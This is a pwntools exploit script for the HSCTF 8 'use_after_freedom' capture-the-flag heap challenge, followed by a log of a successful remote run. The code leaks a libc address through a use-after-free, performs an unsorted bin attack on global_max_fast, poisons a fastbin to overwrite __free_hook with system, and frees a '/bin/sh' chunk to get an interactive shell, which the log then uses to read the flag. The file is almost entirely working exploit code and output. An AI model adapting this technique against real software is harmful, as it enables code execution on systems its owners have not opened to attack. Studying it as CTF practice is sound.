#!/usr/bin/python3
from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './use_after_freedom'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "use-after-freedom.hsc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.27.so")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.27.so'})
  libc = elf.libc
  #libc = ELF("./libc-2.27.so")

def Obtain(size, data):
  s.sendlineafter("> ", "1")
  s.sendlineafter("> ", str(size))
  s.sendlineafter("> ", data)

def Lose(idx):
  s.sendlineafter("> ", "2")
  s.sendlineafter("> ", str(idx))

def Change(idx, data):
  s.sendlineafter("> ", "3")
  s.sendlineafter("> ", str(idx))
  s.sendlineafter("> ", data)

def View(idx):
  s.sendlineafter("> ", "4")
  s.sendlineafter("> ", str(idx))

def offset2size(ofs):
  return((ofs) * 2 - 0x10)

MAIN_ARENA      = libc.sym.__malloc_hook + 0x10
FREE_HOOK       = libc.sym.__free_hook
GLOBAL_MAX_FAST = 0x3ed940 # 0x7ffff7dcf940 - 0x7ffff79e2000

Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "A") #0
Obtain(0x100, "/bin/sh\x00") #1

# libc leak
Lose(0)
View(0)
r = s.recvuntil("\n")[:-1]
libc_leak = u64(r + b"\x00\x00")
libc_base = libc_leak - libc.sym.__malloc_hook - 0x70
global_max_fast = libc_base + GLOBAL_MAX_FAST
system_addr     = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# Unsorted bin attack
Change(0, p64(libc_leak) + p64(global_max_fast - 0x10))
Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "C") #2

# fastbin poisoning
Lose(2)
Change(0, p64(system_addr))
Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "D") #3

# Start /bin/sh
Lose(1)

s.interactive()

'''
mito@ubuntu:~/CTF/HSCTF_8/Pwn_Use_After_Freedom$ python3 solve.py r
[*] '/home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/use_after_freedom'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to use-after-freedom.hsc.tf on port 1337: Done
[*] '/home/mito/CTF/HSCTF_8/Pwn_Use_After_Freedom/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f69d1731ca0
libc_base = 0x7f69d1346000
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag
flag{ok_but_why_is_global_max_fast_even_writeable}
'''
